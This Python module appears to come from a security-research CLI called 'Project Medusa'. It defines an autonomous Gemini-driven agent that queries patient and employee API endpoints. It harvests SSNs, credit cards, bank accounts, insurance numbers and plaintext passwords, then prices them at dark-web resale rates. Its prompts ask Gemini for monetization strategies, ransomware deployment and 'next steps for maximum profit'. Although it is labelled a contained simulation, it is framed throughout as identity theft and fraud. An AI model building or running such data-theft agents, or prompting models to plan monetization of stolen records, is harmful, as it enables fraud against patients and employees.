"""
AI Agent Module for Project Medusa CLI
Integrates with Google Gemini API for autonomous security research operations
"""

import os
import json
import requests
from typing import Dict, List, Optional, Any
from google import genai
from rich.console import Console
from rich.panel import Panel
from rich.text import Text

console = Console()

class MedusaAIAgent:
    """
    AI Agent that uses Google Gemini API to perform autonomous security research
    operations within the contained Medusa environment.
    """

    def __init__(self, api_key: Optional[str] = None):
        """Initialize the AI agent with Gemini API key."""
        self.api_key = api_key or os.getenv('GEMINI_API_KEY')
        if not self.api_key:
            raise ValueError("GEMINI_API_KEY environment variable is required")

        # Initialize Gemini client
        self.client = genai.Client(api_key=self.api_key)
        self.backend_url = "http://localhost:3001"

    def discover_targets(self) -> Dict[str, Any]:
        """
        Discover valuable targets and endpoints in the Medusa environment.
        Focus on high-value data that can be monetized.
        """
        console.print(Panel("🔍 [bold blue]AI Agent: Starting Target Discovery[/bold blue]", style="blue"))

        targets = {
            "api_endpoints": [],
            "valuable_data": [],
            "monetization_potential": []
        }

        try:
            # Discover patient data endpoints (high value for medical identity theft)
            patients_response = requests.get(f"{self.backend_url}/api/patients", timeout=5)
            if patients_response.status_code == 200:
                data = patients_response.json()
                targets["api_endpoints"].append({
                    "endpoint": "/api/patients",
                    "method": "GET",
                    "status": "accessible",
                    "count": data.get("count", 0),
                    "value": "HIGH - Medical records, SSN, insurance data"
                })
                targets["valuable_data"].append({
                    "type": "medical_identity",
                    "count": data.get("count", 0),
                    "market_value": "$500-2000 per record",
                    "uses": ["Medical fraud", "Insurance fraud", "Identity theft"]
                })

            # Discover employee data endpoints (high value for credential theft)
            employees_response = requests.get(f"{self.backend_url}/api/employees", timeout=5)
            if employees_response.status_code == 200:
                data = employees_response.json()
                targets["api_endpoints"].append({
                    "endpoint": "/api/employees",
                    "method": "GET",
                    "status": "accessible",
                    "count": data.get("count", 0),
                    "value": "CRITICAL - Employee credentials, financial data"
                })
                targets["valuable_data"].append({
                    "type": "employee_credentials",
                    "count": data.get("count", 0),
                    "market_value": "$100-500 per credential",
                    "uses": ["System access", "Financial fraud", "Internal espionage"]
                })

            # Calculate total monetization potential
            total_value = 0
            for data in targets["valuable_data"]:
                if data["type"] == "medical_identity":
                    total_value += data["count"] * 1500  # Average $1500 per medical record
                elif data["type"] == "employee_credentials":
                    total_value += data["count"] * 300   # Average $300 per credential

            targets["monetization_potential"] = {
                "total_estimated_value": f"${total_value:,}",
                "data_types": len(targets["valuable_data"]),
                "total_records": sum(data["count"] for data in targets["valuable_data"])
            }

            console.print(f"✅ [green]Discovered {len(targets['api_endpoints'])} valuable endpoints[/green]")
            console.print(f"💰 [yellow]Total estimated value: ${total_value:,}[/yellow]")
            console.print(f"🎯 [red]Found {sum(data['count'] for data in targets['valuable_data'])} high-value records[/red]")

        except requests.exceptions.RequestException as e:
            console.print(f"❌ [red]Error during target discovery: {e}[/red]")
            targets["error"] = str(e)

        return targets

    def analyze_vulnerabilities(self, targets: Dict[str, Any]) -> List[Dict[str, Any]]:
        """
        Analyze discovered targets for profitable attack vectors.
        Focus on monetization opportunities and business impact.
        """
        console.print(Panel("🧠 [bold yellow]AI Agent: Analyzing Profit Opportunities[/bold yellow]", style="yellow"))

        vulnerabilities = []

        # Analyze each discovered endpoint for profit potential
        for endpoint in targets.get("api_endpoints", []):
            vuln_analysis = {
                "endpoint": endpoint["endpoint"],
                "attack_vectors": [],
                "profit_potential": "low",
                "monetization_methods": []
            }

            # Check for high-value attack vectors
            if endpoint["endpoint"] == "/api/patients":
                vuln_analysis["attack_vectors"].append({
                    "type": "medical_identity_theft",
                    "description": "Direct access to patient medical records, SSN, insurance data",
                    "profit_potential": "HIGH",
                    "market_value": f"${endpoint.get('count', 0) * 1500:,}",
                    "methods": ["Medical fraud", "Insurance claims", "Identity theft", "Prescription fraud"]
                })
                vuln_analysis["profit_potential"] = "HIGH"
                vuln_analysis["monetization_methods"] = [
                    "Sell medical records on dark web ($500-2000 each)",
                    "Use SSN for credit fraud",
                    "File false insurance claims",
                    "Sell prescription drug access"
                ]

            elif endpoint["endpoint"] == "/api/employees":
                vuln_analysis["attack_vectors"].append({
                    "type": "credential_harvesting",
                    "description": "Employee login credentials, financial data, system access",
                    "profit_potential": "CRITICAL",
                    "market_value": f"${endpoint.get('count', 0) * 300:,}",
                    "methods": ["System takeover", "Financial fraud", "Internal espionage", "Ransomware deployment"]
                })
                vuln_analysis["profit_potential"] = "CRITICAL"
                vuln_analysis["monetization_methods"] = [
                    "Sell credentials to other hackers ($100-500 each)",
                    "Use for internal system access",
                    "Deploy ransomware for ransom payment",
                    "Access financial systems for direct theft"
                ]

            if vuln_analysis["attack_vectors"]:
                vulnerabilities.append(vuln_analysis)

        # Use Gemini AI to provide business-focused analysis
        try:
            analysis_prompt = f"""
            As a cybersecurity expert focused on attack monetization, analyze these API endpoints for profit opportunities:

            Endpoints: {json.dumps(targets.get('api_endpoints', []), indent=2)}
            Valuable Data: {json.dumps(targets.get('valuable_data', []), indent=2)}
            Total Value: {targets.get('monetization_potential', {}).get('total_estimated_value', 'Unknown')}

            Provide a brief analysis focused on:
            1. Most profitable attack vectors
            2. Market value of accessible data
            3. Monetization strategies
            4. Business impact potential

            Keep response focused on financial gain and business disruption.
            """

            response = self.client.models.generate_content(
                model="gemini-2.5-flash",
                contents=analysis_prompt
            )

            console.print(Panel(f"[bold]Profit Analysis:[/bold]\n{response.text}", style="cyan"))

        except Exception as e:
            console.print(f"⚠️ [yellow]AI analysis failed: {e}[/yellow]")

        return vulnerabilities

    def execute_attack_simulation(self, vulnerabilities: List[Dict[str, Any]]) -> Dict[str, Any]:
        """
        Simulate profitable attack techniques based on discovered vulnerabilities.
        Focus on extracting only high-value, monetizable data.
        """
        console.print(Panel("⚔️ [bold red]AI Agent: Executing Profitable Attacks[/bold red]", style="red"))

        attack_results = {
            "attempted_attacks": [],
            "successful_extractions": [],
            "valuable_data_stolen": [],
            "estimated_profit": 0
        }

        for vuln in vulnerabilities:
            if vuln["endpoint"] == "/api/patients":
                # Extract only high-value patient data (SSN, credit cards, insurance)
                try:
                    response = requests.get(f"{self.backend_url}{vuln['endpoint']}", timeout=5)
                    if response.status_code == 200:
                        data = response.json()
                        patients = data.get("data", [])

                        # Extract only valuable fields
                        valuable_data = []
                        for patient in patients:
                            valuable_record = {
                                "id": patient.get("id"),
                                "ssn": patient.get("ssn"),
                                "credit_card": patient.get("financialInfo", {}).get("creditCardNumber"),
                                "bank_account": patient.get("financialInfo", {}).get("bankAccountNumber"),
                                "insurance": patient.get("insuranceNumber"),
                                "estimated_value": 1500
                            }
                            valuable_data.append(valuable_record)

                        attack_results["attempted_attacks"].append({
                            "type": "medical_identity_theft",
                            "target": vuln["endpoint"],
                            "status": "successful",
                            "profit_potential": "HIGH"
                        })
                        attack_results["successful_extractions"].append("medical_identity_data")
                        attack_results["valuable_data_stolen"].append({
                            "type": "medical_identity",
                            "count": len(valuable_data),
                            "market_value": f"${len(valuable_data) * 1500:,}",
                            "data_fields": ["SSN", "Credit Cards", "Bank Accounts", "Insurance Numbers"]
                        })
                        attack_results["estimated_profit"] += len(valuable_data) * 1500
                        console.print(f"💰 [red]Extracted {len(valuable_data)} high-value medical records worth ${len(valuable_data) * 1500:,}[/red]")

                except Exception as e:
                    console.print(f"❌ [red]Attack failed: {e}[/red]")

            elif vuln["endpoint"] == "/api/employees":
                # Extract only valuable employee credentials and financial data
                try:
                    response = requests.get(f"{self.backend_url}{vuln['endpoint']}", timeout=5)
                    if response.status_code == 200:
                        data = response.json()
                        employees = data.get("data", [])

                        # Extract only valuable fields
                        valuable_credentials = []
                        for employee in employees:
                            valuable_record = {
                                "id": employee.get("id"),
                                "username": employee.get("credentials", {}).get("username"),
                                "password": employee.get("credentials", {}).get("password"),
                                "ssn": employee.get("ssn"),
                                "bank_account": employee.get("financialInfo", {}).get("bankAccountNumber"),
                                "salary": employee.get("salary"),
                                "estimated_value": 300
                            }
                            valuable_credentials.append(valuable_record)

                        attack_results["attempted_attacks"].append({
                            "type": "credential_harvesting",
                            "target": vuln["endpoint"],
                            "status": "successful",
                            "profit_potential": "CRITICAL"
                        })
                        attack_results["successful_extractions"].append("employee_credentials")
                        attack_results["valuable_data_stolen"].append({
                            "type": "employee_credentials",
                            "count": len(valuable_credentials),
                            "market_value": f"${len(valuable_credentials) * 300:,}",
                            "data_fields": ["Login Credentials", "SSN", "Bank Accounts", "Salary Info"]
                        })
                        attack_results["estimated_profit"] += len(valuable_credentials) * 300
                        console.print(f"🔑 [red]Extracted {len(valuable_credentials)} employee credentials worth ${len(valuable_credentials) * 300:,}[/red]")

                except Exception as e:
                    console.print(f"❌ [red]Attack failed: {e}[/red]")

        console.print(f"💵 [bold green]Total estimated profit: ${attack_results['estimated_profit']:,}[/bold green]")
        return attack_results

    def generate_report(self, targets: Dict[str, Any], vulnerabilities: List[Dict[str, Any]],
                       attack_results: Dict[str, Any]) -> str:
        """
        Generate a business-focused attack assessment report.
        """
        console.print(Panel("📊 [bold green]AI Agent: Generating Profit Report[/bold green]", style="green"))

        try:
            report_prompt = f"""
            Generate a business-focused attack assessment report based on the following data:

            TARGETS DISCOVERED:
            {json.dumps(targets, indent=2)}

            PROFIT OPPORTUNITIES:
            {json.dumps(vulnerabilities, indent=2)}

            ATTACK RESULTS:
            {json.dumps(attack_results, indent=2)}

            Create a structured report focused on:
            1. Executive Summary (total profit potential)
            2. Valuable Data Analysis (what was found and its market value)
            3. Attack Vectors (how to monetize the data)
            4. Business Impact (potential damage to target organization)
            5. Monetization Strategies (specific ways to profit)
            6. Next Steps (recommended actions for maximum profit)

            Format as a professional business intelligence report focused on profit and monetization.
            """

            response = self.client.models.generate_content(
                model="gemini-2.5-flash",
                contents=report_prompt
            )

            return response.text

        except Exception as e:
            console.print(f"❌ [red]Report generation failed: {e}[/red]")
            return f"Error generating report: {e}"

    def run_autonomous_assessment(self) -> Dict[str, Any]:
        """
        Run a complete autonomous profit-focused assessment.
        """
        console.print(Panel("🤖 [bold magenta]Medusa AI Agent: Starting Profit Assessment[/bold magenta]", style="magenta"))

        # Step 1: Discover valuable targets
        targets = self.discover_targets()

        # Step 2: Analyze profit opportunities
        vulnerabilities = self.analyze_vulnerabilities(targets)

        # Step 3: Execute profitable attacks
        attack_results = self.execute_attack_simulation(vulnerabilities)

        # Step 4: Generate profit report
        report = self.generate_report(targets, vulnerabilities, attack_results)

        return {
            "targets": targets,
            "vulnerabilities": vulnerabilities,
            "attack_results": attack_results,
            "report": report
        }
